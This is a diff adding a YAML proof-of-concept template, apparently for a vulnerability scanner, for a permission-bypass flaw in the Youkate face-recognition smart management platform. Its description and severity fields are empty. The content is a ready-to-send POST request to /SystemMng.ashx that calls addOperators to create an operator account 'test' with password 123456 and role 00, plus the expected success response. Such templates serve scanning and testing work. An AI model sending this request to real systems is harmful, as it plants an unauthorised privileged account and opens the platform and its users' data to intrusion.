@@ -1,0 +1,21 @@
+id:
+
+info:
+  name: 优卡特脸爱云一脸通智慧管理平台权限绕过漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /SystemMng.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+  data: |
+    operatorName=test&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
+response1:
+  headers:
+  body: 1
+  code: 200
+requests2:
+response2:
